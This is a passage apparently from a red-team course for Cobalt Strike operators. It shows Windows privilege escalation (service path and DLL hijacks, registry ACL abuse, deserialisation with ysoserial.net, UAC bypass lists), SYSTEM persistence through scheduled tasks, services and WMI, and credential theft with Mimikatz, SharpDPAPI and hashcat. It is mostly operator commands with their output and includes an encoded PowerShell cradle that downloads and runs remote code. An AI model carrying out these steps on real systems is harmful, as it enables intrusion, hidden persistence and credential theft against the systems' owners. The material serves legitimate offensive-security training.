Executes a local .NET process assembly on target. This command loads the CLR in a temporary
process and loads the assembly into it. If the assembly is in the data store, this command will
use the loaded item automatically. For more information (help data-store).

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe AntiVirus

====== AntiVirus ======

  Engine                         : Windows Defender
  ProductEXE                     : windowsdefender://
  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe

[*] Completed collection in 0.181 seconds

6.12.6 BOFs

BOFs are compact object files loaded and executed by Beacon via inline-execute:

beacon> help inline-execute
Use: inline-execute [/path/to/file.o] [args]

Run a Beacon Object File in this Beacon session. A Beacon Object File is a 
C program, compiled as an object file, written to use conventions specified 
in the Cobalt Strike documentation. If the Beacon Object File is in the data
store, this command will use the loaded item automatically. For more
information (help data-store).

BOFs are more commonly wrapped in command aliases via Aggressor scripts. TrustedSec's Situational Awareness BOF exposes its BOFs as custom commands — for example, ipconfig replaces shell ipconfig:

beacon> ipconfig

{8566281E-2B05-48AC-9D59-F18E427FCAB6}
	Ethernet
	Microsoft Hyper-V Network Adapter
	02-15-5D-10-BD-E0
	10.10.120.112
Hostname: 	lon-wkstn-1
DNS Suffix: 	contoso.com
DNS Server: 	10.10.120.1

Under the hood, the alias calls beacon_inline_execute($1, readbof($1, "ipconfig", $null, "T1016"), "go", $null);.

7. Privilege Escalation

Operators usually land as standard users after initial access. Privilege Escalation [TA0004] — exploiting misconfigurations to reach local admin or SYSTEM — typically precedes credential access and lateral movement.

Common Windows targets covered in this chapter:

  • Service misconfigurations (binary, registry, unquoted path)
  • DLL search-order hijacks
  • Software vulnerabilities (deserialisation, etc.)
  • UAC bypasses
  • Elevated persistence — once SYSTEM, surviving reboots

Windows Accounts

GroupScopePermissions
UsersLow-privilege user accountsRead/write own files only
AdministratorsLocal adminsFull Control over most objects on the host (directories, files, services)
Service User AccountsBuilt-in SCM service principalsLimited locally; privileges from User Rights Assignments
Service User Accounts

Built-in accounts used by the Service Control Manager (SCM) to run Windows services:

  • NT AUTHORITY\LocalService
  • NT AUTHORITY\NetworkService
  • NT AUTHORITY\SYSTEM

These accounts are not recognised by the security subsystem and do not appear in net user. Their privileges come from User Rights Assignments — security policy settings configured per machine.

User Rights Assignment

User rights enable fine-grained privilege control — service accounts can be more privileged than standard users without being local admins. Categories:

  • Logon rights — control how an account can connect to the system (interactive, network, batch, service)
  • Privileges — control specific system operations once authenticated (e.g. SeDebugPrivilege, SeImpersonatePrivilege)

Sensitive rights like SeImpersonatePrivilege — commonly held by service accounts running web or SQL servers — can be abused to obtain SYSTEM.

Vulnerable Services

Services are one of the largest privesc attack surfaces on Windows because they frequently run as SYSTEM and are vulnerable in several common ways:

  • Binary on disk writable by standard users
  • Service registry key permissions allow reconfiguration
  • Unquoted binary paths containing spaces
  • DLL search-order hijacking opportunities in the service binary's directory
  • Vulnerable code in the service binary itself (deserialization, buffer overflow, etc.)

Enumerate services with built-in utilities (sc.exe, wmic.exe), PowerShell cmdlets (Get-Service, Get-WmiObject), or BOFs/tools using APIs like EnumServicesStatusEx:

beacon> sc_enum

SERVICE_NAME: BadWindowsService
DISPLAY_NAME: BadWindowsService
	TYPE                           : 16 WIN32_OWN
	STATE                          : 4 RUNNING
	WIN32_EXIT_CODE                : 0
	SERVICE_EXIT_CODE              : 0
	CHECKPOINT                     : 0
	WAIT_HINT                      : 0
	PID                            : 3004
	FLAGS                          : 0
	TYPE                           : 10 WIN32_OWN
	START_TYPE                     : 2 AUTO_START
	ERROR_CONTROL                  : 1 NORMAL
	BINARY_PATH_NAME               : C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe
	LOAD_ORDER_GROUP               : 
	TAG                            : 0
	DISPLAY_NAME                   : BadWindowsService
	DEPENDENCIES                   : 
	SERVICE_START_NAME             : LocalSystem
	RESET_PERIOD (in seconds)      : 0
	REBOOT_MESSAGE                 : 
	COMMAND_LINE                   :

Automated tools: PowerSploit, SharpUp. For manual analysis: native apps → Ghidra/IDA Free; .NET apps → dotPeek/dnSpy.

7.1 Path Interception

Path interception covers vulnerabilities where an adversary can drop an executable into a location resolved before the intended binary. The variants below cover the most common cases.

7.1.1 PATH Environment Variable

PATH lists the directories Windows searches for executables. Running net triggers a sequential search until net.exe is found — placing a malicious binary in an earlier directory wins. View the current PATH with env:

beacon> env
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Bad Windows Service;C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps

PATH is constructed from two registry locations:

  • Machine — HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
  • User — HKCU\Environment

User processes use the concatenation of Machine + User; system processes use Machine only. Path interception via PATH [T1574.007] occurs when the Machine variable lists a directory that is also writable by standard users.

Software installers frequently add their own paths before the default ones:

Path=C:\Python313\Scripts\;C:\Python313;C:\Windows\system32;C:\Windows; ... etc ...

This is especially risky when the software is installed under the system root, because directories created there are writable by standard users by default. Check permissions with cacls:

beacon> cacls C:\Python313\Scripts\

C:\Python313\Scripts\ BUILTIN\Administrators:(CI)(OI)F
                      NT AUTHORITY\SYSTEM:(CI)(OI)F
                      BUILTIN\Users:(CI)(OI)R
                      NT AUTHORITY\Authenticated Users:C
                      NT AUTHORITY\Authenticated Users:(CI)(OI)(IO)(special access:)
                                                                   DELETE
                                                                   GENERIC_READ
                                                                   GENERIC_WRITE
                                                                   GENERIC_EXECUTE

cacls output legend: F = full control, C = change, R = read, W = write; (CI) = container inherit, (OI) = object inherit, (IO) = inherit only.

Authenticated Users can write to C:\Python313\Scripts. A service binary that calls cmd /c timeout will trigger a PATH search for timeout.exe; dropping a malicious timeout.exe into the Python directory wins because it precedes System32:

beacon> cd C:\Python313\Scripts
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe timeout.exe

7.1.2 Search Order Hijacking

When a program is executed using a relative path, Windows must search to find it. PATH is only part of the search order; different process APIs use different orders. Path interception via search order hijacking [T1574.008] exploits any attacker-controlled position in that order.

WinExec follows the DLL search order — the directory of the calling binary, the current working directory, System32, System, the Windows directory, then PATH.

CreateProcess behaviour depends on the parameters:

  • lpApplicationName set — only searches the current working directory (services default to C:\Windows\System32)
  • lpCommandLine only — follows the full search order
  • .NET's Process class dispatches to ShellExecuteEx or CreateProcess based on parameters; ShellExecuteEx resolves partial paths from the current working directory

Hijacking cmd.exe is viable when an adversary controls a directory earlier in the search order than the legitimate binary. The only directory that precedes the CWD and System32 is the calling binary's own directory — in this example, C:\Program Files\Bad Windows Service\Service Executable, which Authenticated Users has full control over:

beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable"
C:\Program Files\Bad Windows Service\Service Executable NT AUTHORITY\Authenticated Users:(CI)(OI)F

beacon> cd C:\Program Files\Bad Windows Service\Service Executable
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe cmd.exe

7.1.3 Unquoted Paths

When lpCommandLine contains spaces without quotes, CreateProcess tries each whitespace-split prefix in turn. C:\Program Files\Bad Application\Bad Program.exe is tried as:

  1. C:\Program.exe
  2. C:\Program Files\Bad.exe
  3. C:\Program Files\Bad Application\Bad.exe
  4. C:\Program Files\Bad Application\Bad Program.exe

Unquoted path hijacking [T1574.009] writes a malicious executable into one of the earlier resolved paths. The classic case is a service binary configured with an unquoted path. The sc_enum output below shows BadWindowsService is configured this way:

beacon> sc_enum

SERVICE_NAME: BadWindowsService
    [...snip...]
	BINARY_PATH_NAME               : C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe

Exploitable if a writable location exists along the resolved path — e.g. C:\Program Files\Bad.exe or C:\Program Files\Bad Windows Service\Service.exe:

beacon> cacls "C:\Program Files\Bad Windows Service"
C:\Program Files\Bad Windows Service NT AUTHORITY\Authenticated Users:(CI)(OI)F

beacon> cd C:\Program Files\Bad Windows Service
beacon> upload C:\Payloads\dns_x64.svc.exe
beacon> mv dns_x64.svc.exe Service.exe

The malicious binary runs on next service start — stop and restart with sc_stop/sc_start if you have permissions, otherwise wait for a system reboot.

beacon> sc_stop BadWindowsService
stop_service:
  hostname:    
  servicename: BadWindowsService
SUCCESS.

beacon> sc_start BadWindowsService
start_service:
  hostname:    
  servicename: BadWindowsService
SUCCESS.

7.2 Weak Service Permissions

Service installations sometimes grant overly permissive ACLs on the binary, the registry key, or the service itself — each leading to privilege escalation.

7.2.1 Service File Permissions

If the service binary (or its parent directory) has a weak ACE allowing standard user writes [T1574.010], overwrite it with a malicious binary — SCM executes it on next service start.

beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe"
C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe NT AUTHORITY\Authenticated Users:F

The catch: the service binary cannot be overwritten while the service is running. Stopping and starting the service requires additional permissions, which is also a non-default misconfiguration:

beacon> cd C:\Program Files\Bad Windows Service\Service Executable\
beacon> sc_stop BadWindowsService
beacon> upload C:\Payloads\BadWindowsService.exe
beacon> sc_start BadWindowsService

7.2.2 Service Registry Permissions

Service configs live at HKLM\SYSTEM\CurrentControlSet\Services\<name>. A weak ACE on this registry key [T1574.011] allows modifying the binary path or start-up user to execute a malicious payload.

beacon> powerpick Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BadWindowsService
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\Authenticated Users Allow  FullControl
         BUILTIN\Users Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         ReadKey
Audit  : 
Sddl   : O:BAG:SYD:AI(A;OICI;KA;;;AU)(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)
         (A;CIID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934
         681)

The typical exploit changes the binary path to point at a malicious executable:

beacon> sc_stop BadWindowsService
beacon> sc_config BadWindowsService C:\Path	o\Payload.exe 0 2
beacon> sc_start BadWindowsService

A subtler approach uses the lesser-known Performance subkey (discovered by Clément Labro). The key points to a DLL responsible for monitoring service performance — it's optional, more suited to dev/test than prod, and absent from most service installations by default. An adversary can add it without affecting normal service operation.

7.3 DLL Search Order Hijacking

Most applications reference functionality in external DLLs — both Windows-provided (kernel32.dll, user32.dll) and developer-written. DLLs are referenced by name rather than full path, so Windows resolves them at load time via a defined DLL search order:

  1. The directory the executable was loaded from
  2. C:\Windows\System32
  3. C:\Windows\System
  4. The Windows directory
  5. The current working directory
  6. Directories listed in the PATH environment variable

DLL search-order hijacking [T1574.001] drops a malicious DLL of the expected name into an earlier search-order directory. If the loading process runs elevated, the malicious code inherits those privileges.

Consider a service binary that loads BadDll.dll in a loop using a relative path. The DLL is not present in the service's own directory:

beacon> ls C:\Program Files\Bad Windows Service\Service Executable

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 9kb      fil     01/06/2025 16:10:12   BadWindowsService.exe

PATH reveals that C:\Program Files\Bad Windows Service has been appended to the system PATH variable, which is where the loader finds the DLL:

beacon> env
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Bad Windows Service;C:\Users\kbowles\AppData\Local\Microsoft\WindowsApps

Listing the directory confirms BadDll.dll sits there:

beacon> ls C:\Program Files\Bad Windows Service

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/06/2025 16:12:31   Service Executable
 10kb     fil     01/06/2025 16:10:12   BadDll.dll

The executing directory is searched before the location currently providing the DLL — and it's writable by Authenticated Users, so dropping a malicious BadDll.dll there wins:

beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable"
C:\Program Files\Bad Windows Service\Service Executable NT AUTHORITY\Authenticated Users:(CI)(OI)F

Upload a Beacon DLL payload as BadDll.dll into the executing directory:

beacon> cd C:\Program Files\Bad Windows Service\Service Executable
beacon> upload C:\Payloads\dns_x64.dll
beacon> mv dns_x64.dll BadDll.dll

7.4 Software Vulnerabilities

Applications running in elevated contexts may be exploitable via traditional vulnerabilities [T1068] — buffer overflows, format strings, directory traversal, SQL or command injection, and deserialisation of untrusted data. Exploitation from a user context results in elevation of privilege.

Example: a service reads C:\Temp\data.bin from an untrusted location and deserialises it with BinaryFormatter. Writing a malicious binary blob to that path triggers code execution under the service's privileges.

Generate the payload with ysoserial.net — the TypeConfuseDelegate gadget with the BinaryFormatter formatter runs a PowerShell one-liner:

C:\Users\Attacker>C:\Tools\ysoserial.net\ysoserial\bin\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAzADEANAA5ADAALwAnACkA" -o raw --outputpath=C:\Payloads\data.bin

Upload the file to the target and wait for the DNS Beacon to check in:

beacon> cd C:\Temp
beacon> upload C:\Payloads\data.bin

7.5 User Account Control

Mandatory Integrity Control (MIC) enforces access via integrity levels:

LevelTypical principalsCapability
LowSandboxed processes (e.g. browsers)Very restricted writes
MediumStandard users; admins not yet elevatedUser-scope operations only
HighElevated admin processesAdministrative operations
SystemSYSTEM and service accountsFull system access

A principal cannot modify objects above its own integrity level. Even local admins run at medium integrity by default — UAC gates the elevation to high integrity via a consent or credential prompt. Known bypasses [T1548.002] are covered below.

7.5.1 Elevators & Exploits

Two high-integrity execution primitives:

  • Elevator (runasadmin) — runs any command/args in high-integrity context
  • Exploit (elevate) — spawns a new elevated Beacon session

Built-in UAC bypasses included; custom ones can be added via Aggressor. Implementations support PowerShell, .NET, reflective DLL, and BOF.

7.5.2 elevate

Syntax: elevate [exploit] [listener]. Running elevate with no arguments lists the available exploits:

beacon> elevate

Beacon Local Exploits
=====================

    Exploit                         Description
    -------                         -----------
    cve-2020-0796                   SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796)
    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)
    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)
    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)
    svc-exe                         Get SYSTEM via an executable run as a service
    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
    uac-token-duplication           Bypass UAC with Token Duplication

7.5.3 runasadmin

Syntax: runasadmin [exploit] [command] [args]. Running runasadmin with no arguments lists the available elevators:

beacon> runasadmin

Beacon Command Elevators
========================

    Exploit                         Description
    -------                         -----------
    ms16-032                        Secondary Logon Handle Privilege Escalation (CVE-2016-099)
    uac-cmstplua                    Bypass UAC with CMSTPLUA COM interface
    uac-eventvwr                    Bypass UAC with eventvwr.exe
    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
    uac-token-duplication           Bypass UAC with Token Duplication
    uac-wscript                     Bypass UAC with wscript.exe

runasadmin can execute any arbitrary command, not just spawn a Beacon.

7.6 Elevated Persistence

Once privileged access is obtained, persistence at that level keeps the elevation across reboots and after the initial vector is patched, mitigated, or becomes too loud to repeat.

7.7 Scheduled Task

The Windows Task Scheduler can run tasks as SYSTEM or as standard users. After elevation, the adversary can maintain access by creating a task that re-executes a payload on a chosen trigger. The XML below registers a task that runs as SYSTEM on boot:

<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<Triggers>
		<BootTrigger>
			<Enabled>true</Enabled>
		</BootTrigger>
	</Triggers>
	<Principals>
		<Principal>
			<UserId>NT AUTHORITY\SYSTEM</UserId>
			<RunLevel>HighestAvailable</RunLevel>
		</Principal>
	</Principals>
	<Settings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>true</Hidden>
	</Settings>
	<Actions>
		<Exec>
			<Command>C:\Windows\System32\beacon_x64.exe</Command>
		</Exec>
	</Actions>
</Task>
beacon> cd C:\Windows\System32
beacon> upload C:\Payloads\beacon_x64.exe
beacon> schtaskscreate \Beacon XML CREATE

createTask hostname: taskpath:\Beacon mode:2 force:0
Got user name and security descriptor
Valitdated task
Created task path
Registered task
SUCCESS.

7.8 Windows Service

A Windows service running as SYSTEM provides equivalent boot-time persistence at high integrity. Create one from Beacon with sc_create:

beacon> cd C:\Windows\System32\
beacon> upload C:\Payloads\beacon_x64.svc.exe
beacon> mv beacon_x64.svc.exe debug_svc.exe

beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3

 create_service:
  hostname:     
  servicename:  dbgsvc
  displayname:  Debug Service
  binpath:      C:\Windows\System32\debug_svc.exe
  newdesc:      The Windows Debug Service
  desclen:      26
  ignoremode:   0
  startmode:    2
  service_type: 10
SUCCESS.

Verify the service configuration with sc_qc:

beacon> sc_qc dbgsvc

SERVICE_NAME: dbgsvc
	TYPE                 : 10 WIN32_OWN
	START_TYPE           : 2 AUTO_START
	ERROR_CONTROL        : 0 IGNORE
	BINARY_PATH_NAME     : C:\Windows\System32\debug_svc.exe
	LOAD_ORDER_GROUP     : 
	TAG                  : 0
	DISPLAY_NAME         : Debug Service
	DEPENDENCIES         : 
	SERVICE_START_NAME   : LocalSystem
	CURRENT_STATUS       : STOPPED

7.9 Windows Management Instrumentation

WMI (Windows Management Instrumentation) is Microsoft's WBEM/CIM implementation for managing enterprise components. Managed objects include processes, registry keys, services, and file information. Matt Graeber's Black Hat talk popularised WMI for red team persistence.

WMI objects are queried with WMI Query Language (WQL), a SQL-like dialect.

7.9.1 Queries

WQL supports two query types relevant to adversary use:

  • Instance queries — snapshot of current state
  • Event queries — fire when a matching event occurs in future
Instance Queries

Snapshot queries that return information at the moment of execution:

SELECT [PROPERTY] FROM [CLASS NAME] <WHERE [CONSTRAINT]>

Example — return all currently running notepad.exe processes:

SELECT * FROM Win32_Process WHERE Name = 'notepad.exe'
Event Queries

Fire on a future event rather than at execution time:

SELECT [PROPERTY] FROM [INTRINSIC CLASS NAME] WITHIN [POLLING INTERVAL] <WHERE [CONSTRAINT]>

Example — fire within 5 seconds of notepad.exe launching:

SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'

7.9.2 Eventing

WMI's most powerful feature for adversaries is the ability to bind an action to a WMI event query — triggering custom code when practically any system event occurs.

Local events

Local event registrations live within a single process context. They are not useful for persistence but help when testing event filters:

PS C:\> Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'" -SourceIdentifier NotepadEvent
PS C:\> Wait-Event -SourceIdentifier NotepadEvent

Wait-Event blocks until a matching event arrives:

ComputerName     :
RunspaceId       : e0d532de-0ece-4219-8b7d-fc10ea7e2f59
EventIdentifier  : 1
Sender           : System.Management.ManagementEventWatcher
SourceEventArgs  : System.Management.EventArrivedEventArgs
SourceArgs       : {System.Management.ManagementEventWatcher, System.Management.EventArrivedEventArgs}
SourceIdentifier : NotepadEvent
TimeGenerated    : 21/01/2026 15:33:23
MessageData      :

Unregister with Unregister-Event:

PS C:\> Unregister-Event -SourceIdentifier NotepadEvent
Persistent events

Persistent events are stored in the WMI repository, run as SYSTEM, and survive reboots. Three components are required:

  • __EventFilter — the WQL query defining when to fire
  • EventConsumer — the action to take (commonly CommandLineEventConsumer or ActiveScriptEventConsumer)
  • __FilterToConsumerBinding — binds the filter to the consumer

The example below registers a CommandLineEventConsumer that writes "test" to a file whenever notepad.exe runs:

$filterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = "Test Filter"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
    QueryLanguage = 'WQL'
}
    
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs
    
$consumerArgs = @{
    Name = "Test Consumer"
    CommandLineTemplate = "%COMSPEC% /c echo test > C:	est.txt"
}
    
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
    
$filterToConsumerArgs = @{
    Filter = $filter
    Consumer = $consumer
}
    
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $filterToConsumerArgs

Win32_NTLogEvent filters on entries in the Application, Security, and System logs. Event ID 4800 is logged when a user locks their workstation — useful for firing a payload when they step away:

SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '4800'

7.9.3 Remote triggers

WMI enables creative remote persistence triggers. Enable Audit Filtering Platform Packet Drop and subscribe to event ID 5152 — any blocked inbound packet fires the payload. The filter below fires on a dropped packet to port 4444:

SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '5152' AND TargetInstance.Message LIKE '%Destination Port:%4444%'

8. Credential Access

Credential Access [TA0006] covers theft of usernames, passwords, NTLM hashes, and Kerberos tickets. Credential use is less suspicious than exploitation and enables lateral movement.

Sources covered in this chapter:

SourceRequired privileges
Browser saved loginsUser context
Windows Credential ManagerUser context (own creds); local admin (others)
LSASS memoryLocal admin / SYSTEM
SAM databaseSYSTEM
LSA SecretsSYSTEM
Cached domain credentialsSYSTEM
Kerberos tickets (LSA)Per-session user; SYSTEM for cross-session

8.1 Credentials from Web Browsers

Many web applications still require plaintext credentials despite SSO availability, and users commonly let browsers save them. Browsers typically encrypt saved credentials with the Windows Data Protection API (DPAPI) and store them in a local database. Adversaries with access to the user context can read and decrypt this database to recover plaintext passwords [T1555.003].

The exact procedure varies per browser. Most Chromium-based browsers store a SQLite database at %LOCALAPPDATA%\<vendor>\<browser>\User Data\Default\Login Data — Chrome, for example, at %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data. SharpChrome automates the read-and-decrypt step:

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins

8.2 Windows Credential Manager

The Windows Credential Manager stores other user-saved credentials — Remote Desktop, network shares, web sessions. Adversaries can decrypt these to recover the plaintext [T1555.004]. The native vaultcmd utility lists any saved entries:

beacon> run vaultcmd /listcreds:"Windows Credentials" /all

Credentials in vault: Windows Credentials

Credential schema: Windows Domain Password Credential
Resource: Domain:target=TERMSRV/10.10.120.10
Identity: Administrator
Hidden: No
Roaming: No
Property (schema element id,value): (100,2)

Seatbelt's WindowsVault command provides the same information with additional context:

beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

====== WindowsVault ======

  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials
  Item count     : 1
      SchemaGuid   : 3e0e35be-1b77-43e7-b873-aed901b6275b
      Resource     : String: Domain:target=TERMSRV/lon-ws-1
      Identity     : String: LON-WS-1\Administrator
      PackageSid   : (null)
      Credential   : 
      LastModified : 14/02/2025 14:02:28

Credential blobs are AES-encrypted with a randomly-generated key, which is itself encrypted with the user's DPAPI masterkey. Manual decryption: locate the masterkey → decrypt with DPAPI → decrypt the blob. SharpDPAPI automates the chain:

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc

Folder       : C:\Users\pchilds\AppData\Local\Microsoft\Credentials\

  CredFile           : 9CAEEF854B7702E986B47C751DFE9AD2

    guidMasterKey    : {120b3a8a-683d-4db8-8f13-e4c466949bd2}
    size             : 396
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data
    LastWritten      : 14/02/2025 14:02:28
    TargetName       : Domain:target=TERMSRV/lon-ws-1
    TargetAlias      :
    Comment          :
    UserName         : LON-WS-1\Administrator
    Credential       : Passw0rd!

The credentials command decrypts saved credential blobs for the current user. With no arguments it uses cached keys; /rpc uses MS-BKRP to request the DC to decrypt the masterkey (DCs hold a backup copy).

8.3 OS Credential Dumping

OS Credential Dumping [T1003] extracts stored or cached credential material from the operating system. Every sub-technique below requires SYSTEM privileges on the host.

8.3.1 LSASS Memory

The Local Security Authority Subsystem Service (LSASS) verifies credentials at logon, handles password changes, and creates access tokens. Cached credentials in LSASS memory can be read by an adversary with sufficient access [T1003.001].

Microsoft's Security Support Provider Interface (SSPI) — their implementation of the Generic Security Service API (GSSAPI) — provides Windows authentication via pluggable Security Support Providers:

  • NTLM — challenge-response authentication for non-domain and legacy scenarios
  • Kerberos — ticket-based authentication in Active Directory
  • Digest — HTTP authentication; deprecated
  • WDigest — historically cached plaintext passwords; disabled by default since 2014
  • LiveSSP — Microsoft account authentication
  • CredSSP — credential delegation (used by Remote Desktop)

Each SSP ships as a separate DLL loaded into LSASS at boot. Each stores and handles credentials differently, which is why Mimikatz has SSP-specific commands.

Cobalt Strike has Mimikatz built in. The mimikatz command runs any Mimikatz module directly. Two prefixes change execution context:

PrefixBehaviourUse Case
!Elevate to SYSTEM firstRequired for lsadump::sam
@Impersonate Beacon's thread tokenRemote ops like lsadump::dcsync
NTLM Hashes

logonpasswords is an alias for sekurlsa::logonpasswords — dumps NTLM hashes for users that have recently authenticated to the host:

beacon> mimikatz sekurlsa::logonpasswords

User Name         : pchilds
Domain            : CONTOSO
Logon Server      : LON-DC-1
Logon Time        : 17/02/2025 09:45:28
SID               : S-1-5-21-3926355307-1661546229-813047887-1105
	msv :	
	 [00000003] Primary
	 * Username : pchilds
	 * Domain   : CONTOSO
	 * NTLM     : fc525c9683e8fe067095ba2ddc971889
	 * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
	 * DPAPI    : 650b40d81e1d02eb6908bbcefcf78732

Domain            : CONTOSO
Logon Server      : LON-DC-1
Logon Time        : 17/02/2025 09:53:40
SID               : S-1-5-21-3926355307-1661546229-813047887-1108
	msv :	
	 [00000003] Primary
	 * Username : rsteel
	 * Domain   : CONTOSO

Crack with Hashcat mode 1000:

PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 1000 .
tlm.hash .\example.dict -r .\rules\dive.rule
fc525c9683e8fe067095ba2ddc971889:Passw0rd!

Hashes can also be used directly via pass-the-hash.

Kerberos Keys

sekurlsa::ekeys dumps users' Kerberos encryption keys:

	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889

	 * Username : rsteel
	 * Domain   : CONTOSO.COM
	 * Password : (null)
	 * Key List :
	   des_cbc_md4       05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889
	   des_cbc_md4       fc525c9683e8fe067095ba2ddc971889

AES256 Kerberos hashes are salted — far slower to crack than NTLM (benchmark: 140 GH/s vs 1375 kH/s on a 4070). Hashcat format: $krb5db$18$<user>$<DOMAIN>$<hash>, mode 28900.

PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
$krb5db$18$rsteel$CONTOSO.COM$05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960:Passw0rd!

The practical use for these keys is requesting Kerberos tickets — far faster than cracking.

OPSEC

LSASS dumping is noisy — AV and EDR drivers use ObRegisterCallbacks to alert on any process opening a handle to LSASS. Avoid direct LSASS access when alternatives exist:

Process accessed:

SourceProcessId: 5744
SourceThreadId: 4724
SourceImage: C:\Windows\system32\rundll32.exe
TargetProcessId: 772
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1010
CallTrace: C:\Windows\SYSTEM32
tdll.dll+9d9b4|C:\Windows\System32\KERNELBASE.dll+338ae|UNKNOWN(00000202CDF78124)
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM

8.3.2 Security Account Manager

The Security Account Manager (SAM) stores local account credentials across the HKLM\sam and HKLM\system hives. SYSTEM access allows extraction of usernames and password hashes [T1003.002]:

beacon> mimikatz !lsadump::sam

Domain : LON-WKSTN-1
SysKey : a975bfd9830a0c6a82f3449ccc88432d
Local SID : S-1-5-21-3729176663-3746934411-1052919527

SAMKey : a895742da6fa699fbbf1d410bfbe49e0

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
    lm  - 0: 4b2c6e5db76fe295603b423c72f9b271
    ntlm- 0: fc525c9683e8fe067095ba2ddc971889
    ntlm- 1: fc525c9683e8fe067095ba2ddc971889

